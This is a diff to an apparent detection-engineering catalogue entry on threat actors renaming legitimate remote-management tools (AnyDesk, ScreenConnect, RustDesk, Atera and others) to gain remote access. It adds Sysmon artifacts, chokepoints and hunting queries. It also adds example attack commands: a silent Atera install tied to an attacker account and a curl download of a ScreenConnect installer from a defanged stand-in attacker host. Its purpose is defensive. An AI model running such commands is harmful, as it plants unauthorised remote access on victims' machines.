@@ -3,6 +3,7 @@ Id: b3d5e7f9-1a2c-4b6d-8e0f-3c5a7b9d1e2f
 MitreIds:
 - T1219.002
 Tactics:
+- Initial Access
 - Command and Control
 Techniques:
 - Remote Desktop Software
@@ -23,17 +24,36 @@ Variations:
 - Name: AnyDesk
   FirstSeen: '2020'
   Status: Declining
+  SourceURL: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-025a
   NotesShort: Declining; February 2024 production breach revoked signing cert, driving actor migration
   Notes: 'Common masquerade names: invoice.exe, tax_form.exe, SSN_verification.exe; February 2024 production server breach
     resulted in source code and code signing certificate theft — certificate revoked, driving threat actor migration to other
     tools'
   VariantId: anydesk
+  Command:
+    Invocation: "# User downloads \"Invoice_2024.exe\" via browser\n# PE metadata reveals: OriginalFilename = \"AnyDesk.exe\", Company = \"AnyDesk Software GmbH\"\n# Execution establishes C2 to *.net.anydesk.com relay\n# Attacker's AnyDesk ID connects to victim's session"
+    Context: 'Most common renamed RMM in 2023-2024. Filename-to-metadata mismatch is the detection signal. AnyDesk code signing cert stolen and revoked February 2024.'
+    Artifacts:
+    - 'Sysmon EID 11: Executable written to Downloads/Temp by browser process'
+    - 'Sysmon EID 1: Process where Image filename differs from OriginalFilename in PE header'
+    - 'Sysmon EID 3: Outbound to *.net.anydesk.com on 443/6568'
+    - 'Sysmon EID 13: AnyDesk registry keys created despite different filename'
+  ChokepointMapping: 'Browser download → renamed binary execution (filename differs from PE metadata) → outbound to AnyDesk relay'
 - Name: TeamViewer
   FirstSeen: '2019'
   Status: Active
+  SourceURL: https://www.proofpoint.com/us/blog/threat-insight/remote-monitoring-and-management-rmm-tooling-increasingly-attackers-first-choice
   NotesShort: 'Common masquerade names: update.exe, system_check.exe'
   Notes: 'Common masquerade names: update.exe, system_check.exe'
   VariantId: teamviewer
+  Command:
+    Invocation: "# User downloads \"Meeting_Link.exe\" or \"Support_Tool.exe\"\n# PE metadata: OriginalFilename = \"TeamViewer.exe\", Company = \"TeamViewer Germany GmbH\"\n# Establishes connection to *.teamviewer.com relay"
+    Context: 'One of earliest RMM tools abused for C2 (since 2019). Often delivered as IT support tool during TOAD social engineering calls.'
+    Artifacts:
+    - 'Sysmon EID 11: Executable downloaded by browser with non-TeamViewer name'
+    - 'Sysmon EID 1: Process where filename differs from TeamViewer PE metadata'
+    - 'Sysmon EID 3: Outbound to *.teamviewer.com'
+  ChokepointMapping: 'Browser download → renamed TeamViewer execution → outbound to teamviewer.com relay'
 - Name: ScreenConnect (ConnectWise)
   FirstSeen: '2022'
   Status: Active
@@ -44,19 +64,46 @@ Variations:
     Basta, and Bl00dy — 18,188 exposed instances globally at time of disclosure; dual vector: user-delivered binary AND direct
     server exploitation'
   VariantId: screenconnect-connectwise
+  Command:
+    Invocation: "# User downloads \"SecurityUpdate.exe\" or \"TaxForm_2024.msi\"\n# MSI installs ScreenConnect client silently\n# Connects to attacker-controlled instance:\n#   hxxps[://]attacker-instance[.]screenconnect[.]com\n# or self-hosted: hxxps[://]attacker-server[.]com:8040"
+    Context: 'Primary RMM in campaign use since 2022. CISA AA23-025A. CVE-2024-1709 (auth bypass) enabled direct exploitation of 18,000+ exposed instances.'
+    Artifacts:
+    - 'Sysmon EID 11: MSI/EXE downloaded by browser with campaign-themed name'
+    - 'Sysmon EID 1: ScreenConnect.ClientService.exe installed'
+    - 'Sysmon EID 3: Outbound HTTPS to *.screenconnect.com or non-standard port'
+    - 'Windows System EID 7045: ScreenConnect service installed'
+  ChokepointMapping: 'Browser download → MSI/EXE install → ScreenConnect service created → HTTPS C2 to attacker instance'
 - Name: UltraViewer
   FirstSeen: '2023'
   Status: Active
+  SourceURL: https://www.seqrite.com/blog/exploiting-legitimate-remote-access-tools-in-ransomware-campaigns/
   NotesShort: Low name recognition makes it credible as a disguised security tool
   Notes: 'Common masquerade names: security_scan.exe, verify.exe'
   VariantId: ultraviewer
+  Command:
+    Invocation: "# User downloads \"Document_Viewer.exe\"\n# PE metadata: OriginalFilename = \"UltraViewer.exe\"\n# Connects to UltraViewer relay infrastructure"
+    Context: 'Adopted to evade AnyDesk-specific detections. Less monitored by security tools due to lower market share.'
+    Artifacts:
+    - 'Sysmon EID 11: Executable with non-UltraViewer filename'
+    - 'Sysmon EID 1: Process with UltraViewer PE metadata from Downloads/Temp'
+    - 'Sysmon EID 3: Outbound to UltraViewer relay'
+  ChokepointMapping: 'Browser download → renamed UltraViewer execution → outbound to UltraViewer relay'
 - Name: RustDesk
   FirstSeen: '2023'
   Status: Active
+  SourceURL: https://asec.ahnlab.com/en/84729/
   NotesShort: Open-source; self-hosted infrastructure makes domain-based blocking ineffective
   Notes: Open-source; self-hosted infrastructure makes domain blocking ineffective; first documented in Akira ransomware and
     Scattered Spider operations mid-2023; broader adoption through 2024
   VariantId: rustdesk
+  Command:
+    Invocation: "# Open-source self-hosted RMM — no vendor relay to block\n# Attacker runs their own RustDesk server\n# Victim downloads renamed rustdesk.exe\n# Config points to attacker relay: hxxps[://]attacker-relay[.]com:21116"
+    Context: 'Self-hosted = domain/IP blocking ineffective. Adopted by Akira and Scattered Spider. Detection must be behavioral, not domain-based.'
+    Artifacts:
+    - 'Sysmon EID 11: rustdesk.exe written with non-standard filename'
+    - 'Sysmon EID 1: Process with RustDesk PE metadata from unexpected path'
+    - 'Sysmon EID 3: Outbound to non-standard IP on port 21116/21117'
+  ChokepointMapping: 'Browser download → renamed rustdesk.exe execution → outbound to self-hosted relay (no vendor domain to block)'
 - Name: SimpleHelp
   FirstSeen: 2025-Q1
   Status: Active
@@ -66,31 +113,66 @@ Variations:
     January 2025; exploited in the wild since January 22, 2025 as ransomware initial access vector; DragonForce deployed via
     it; CISA advisory AA25-163A issued June 2025; CISA KEV listed February 2025
   VariantId: simplehelp
+  Command:
+    Invocation: "# Two attack paths:\n# Path 1: Renamed binary (social engineering) — PE metadata mismatch\n# Path 2: CVE exploitation (server-side):\n# CVE-2024-57727 (path traversal) + CVE-2024-57726 (privesc) + CVE-2024-57728 (RCE)"
+    Context: 'Three critical CVEs (Jan 2025) enabled exploitation of 18,000+ exposed instances. Both social engineering AND server-side paths. Used by DragonForce for ransomware.'
+    Artifacts:
+    - 'Path 1: Same as other renamed RMM (PE metadata mismatch)'
+    - 'Path 2: SimpleHelp server logs showing exploitation'
+    - 'Sysmon EID 3: Outbound from SimpleHelp client to attacker instance'
+  ChokepointMapping: 'Social eng delivery OR CVE exploitation → SimpleHelp session → attacker remote access'
 - Name: NetSupport Manager
   FirstSeen: '2019'
   Status: Active
+  SourceURL: https://www.esentire.com/blog/unpacking-netsupport-rat-loaders-delivered-via-clickfix
   NotesShort: Long-abused via ClickFix clipboard delivery; remains common in commodity phishing
   Notes: Long-abused RMM (the 'NetSupport RAT' name derives from this tool); TA571 and the ClearFake cluster began ClickFix
     clipboard delivery specifically in March 2024; remains one of the most common RMM payloads in commodity phishing operations
     through 2025
   VariantId: netsupport-manager
+  Command:
+    Invocation: "# Drops NetSupport client files to AppData or ProgramData:\n# client32.exe + client32.ini (attacker gateway config)\n# client32.ini contains:\n# [HTTP]\n# Gateway=hxxps[://]attacker-gateway[.]com"
+    Context: 'Legitimate remote support tool abused since 2019. Config file (client32.ini) points to attacker gateway. Often delivered via ClickFix campaigns.'
+    Artifacts:
+    - 'Sysmon EID 11: client32.exe + client32.ini written to AppData/ProgramData'
+    - 'Sysmon EID 1: client32.exe running from non-standard path'
+    - 'Sysmon EID 3: Outbound to attacker gateway (not official NetSupport infra)'
+  ChokepointMapping: 'Payload delivery → client32.exe + ini deployed → NetSupport connects to attacker gateway'
 - Name: Atera
   FirstSeen: '2022'
   Status: Active
+  SourceURL: https://harfanglab.io/insidethelab/muddywater-rmm-campaign/
   NotesShort: Used by MuddyWater in nation-state campaigns since mid-2022
   Notes: Used by MuddyWater (Iran/TA450) in nation-state campaigns since mid-2022; intense campaign wave October 2023–April
     2024 targeting Israeli manufacturing, tech, and infosec sectors; also deployed post-compromise as secondary RMM after
     ScreenConnect CVE-2024-1709 exploitation in European targets
   VariantId: atera
+  Command:
+    Invocation: "msiexec /i AteraSetup.msi /qn INTEGRATORLOGIN=attacker@email.com ACCOUNTID=<attacker_account>\n# Silent install, agent registers to attacker's Atera account"
+    Context: 'Cloud-based RMM. MSI registers agent to attacker Atera account. Uses legitimate Atera cloud — domain blocking difficult.'
+    Artifacts:
+    - 'Sysmon EID 1: msiexec.exe with /qn flag installing Atera MSI'
+    - 'Sysmon EID 11: AteraAgent.exe installed'
+    - 'Sysmon EID 3: Outbound to *.atera.com'
+  ChokepointMapping: 'MSI delivery → silent install → Atera agent registers to attacker account → cloud C2'
 - Name: RMM-to-RMM Deployment
   FirstSeen: '2024'
   Status: Active
+  SourceURL: https://www.microsoft.com/en-us/security/blog/2026/03/03/signed-malware-impersonating-workplace-apps-deploys-rmm-backdoors/
   NotesShort: First RMM deploys a second for redundancy; removes single point of C2 failure
   Notes: 'One RMM (e.g., ScreenConnect) deploys a second RMM (e.g., AnyDesk) for redundancy — if one is removed, the other
     maintains access
 
     '
   VariantId: rmm-to-rmm-deployment
+  Command:
+    Invocation: "# First RMM deploys second as backup persistence:\ncmd /c curl -o C:\\Temp\\ScreenConnect.msi hxxps[://]attacker-instance[.]screenconnect[.]com/Bin/ConnectWiseControl.ClientSetup.msi\nmsiexec /i C:\\Temp\\ScreenConnect.msi /qn"
+    Context: 'Pattern emerged 2024-H2. First RMM deploys second for redundancy. Documented in Hunters International campaigns (AnyDesk + ScreenConnect simultaneously).'
+    Artifacts:
+    - 'Sysmon EID 1: RMM process spawning cmd.exe → curl → msiexec'
+    - 'Sysmon EID 11: Second RMM installer written to disk'
+    - 'Sysmon EID 3: Two simultaneous outbound RMM connections to different relays'
+  ChokepointMapping: 'First RMM established → downloads second RMM → silent install → dual C2 channels'
 MasqueradeThemes:
 - Theme: Tax / IRS / W-2
   EvidenceQuality: Strong
@@ -301,10 +383,25 @@ MasqueradeThemes:
 Prerequisites:
 - User account can execute binaries from browser download paths (Downloads, Temp, AppData)
 - RMM binary carries a valid vendor code-signing certificate — hash-based detection does not fire
+AttackerControls:
+- Choice of RMM tool (AnyDesk, ScreenConnect, TeamViewer, RustDesk)
+- Social engineering pretext (tax form, IT helpdesk, invoice)
+- Filename used to masquerade the RMM binary
+- Delivery infrastructure (compromised site, malvertising, email)
+- C2 relay configuration (vendor cloud vs. self-hosted)
+AttackerCannotControl:
+- RMM binary must be downloaded to disk via browser
+- Binary must execute as a process — PE metadata reveals true identity
+- Outbound connection to RMM relay is required for remote access
+- File creation event is logged (Sysmon EID 11)
+- Process creation event is logged with OriginalFilename mismatch
 Chokepoints:
 - Stage: Browser Download
+  Input: User clicks a link or is directed to download a file from an attacker-controlled or compromised site
   Invariant: Browser process creates an executable in a user-writable path (Downloads, Temp, AppData) with a campaign-themed
     or generic filename masking RMM software
+  Observable: 'Sysmon EID 11 showing browser process (chrome.exe, msedge.exe) writing an executable to Downloads/Temp.
+    File hash matches a known RMM tool despite the campaign-themed filename.'
   WhyCantBypass: The binary must land on disk before execution — no in-memory-only path exists for the initial delivery of
     a standalone RMM installer; the file must be hosted on an attacker-controlled or compromised site reachable by the victim's
     browser, so delivery cannot be skipped in any variant including TOAD phone-assisted delivery
@@ -314,8 +411,11 @@ Chokepoints:
   DetectionTier: Hunt
   SigmaRef: sigma-rules/renamed-rmm/hunt.yml
 - Stage: User Execution
+  Input: RMM binary exists on disk with a masqueraded filename
   Invariant: User executes the downloaded binary, which is a legitimately-signed RMM tool regardless of its filename — PE
     metadata (OriginalFilename, Company) betrays the mismatch
+  Observable: 'Sysmon EID 1 showing process creation where Image filename differs from PE OriginalFilename metadata.
+    For example: Image=tax_form.exe but OriginalFilename=AnyDesk.exe or Company=philandro Software GmbH.'
   WhyCantBypass: The binary must execute to establish C2 — no execution means no remote access regardless of delivery success
   LogSources:
   - Sysmon Event ID 1 (Process Creation)
@@ -325,8 +425,11 @@ Chokepoints:
   BypassNote: CVE exploitation of internet-exposed RMM servers (ScreenConnect CVE-2024-1709, SimpleHelp CVE-2024-57727) bypasses
     all user-execution detection — monitor RMM server process telemetry separately
 - Stage: Outbound RMM Connection
+  Input: RMM process is running on the endpoint
   Invariant: Executed binary establishes a persistent connection to RMM relay or attacker-controlled server on standard HTTPS
     ports
+  Observable: 'Sysmon EID 3 showing outbound HTTPS connection from a process whose Image path is in a user-writable
+    directory to known RMM relay domains or self-hosted infrastructure.'
   WhyCantBypass: The C2 channel must be established — the entire purpose of RMM tool deployment is persistent remote access
   LogSources:
   - Sysmon Event ID 3 (Network Connection)
@@ -453,10 +556,12 @@ RelatedChokepoints:
 - remote-execution-tools
 OsintSources:
 - Platform: URLScan
-  Query: filename:tax*.exe OR filename:invoice*.exe OR filename:ssn*.exe OR filename:support*.exe OR filename:verify*.exe
-  URL: https://urlscan.io/search/#filename%3Atax*.exe%20OR%20filename%3Ainvoice*.exe%20OR%20filename%3Assn*.exe
-  Notes: Finds download pages serving tax/invoice/support-themed executables; extend with seasonal pretexts during relevant
-    periods.
+  Query: 'filename:MicrosoftTeams.msi OR filename:chrome_update.exe OR filename:security_scan.exe OR filename:verify.exe OR filename:support.exe'
+  URL: https://urlscan.io/search/#filename%3AMicrosoftTeams.msi%20OR%20filename%3Achrome_update.exe%20OR%20filename%3Asecurity_scan.exe%20OR%20filename%3Averify.exe%20OR%20filename%3Asupport.exe
+  Notes: 'Targets documented masquerade filenames used in renamed RMM campaigns — fake Teams installers
+    (March 2026 signed malware campaign), fake Chrome updates (SocGholish/FakeUpdates), and security/support
+    themed binaries (UltraViewer campaigns). Rotate with seasonal themes: tax-document, invoice, SSN,
+    E-Invite, Party Card Viewer during relevant periods.'
 - Platform: Shodan
   Query: product:"ScreenConnect"
   URL: https://www.shodan.io/search?query=product%3A%22ScreenConnect%22
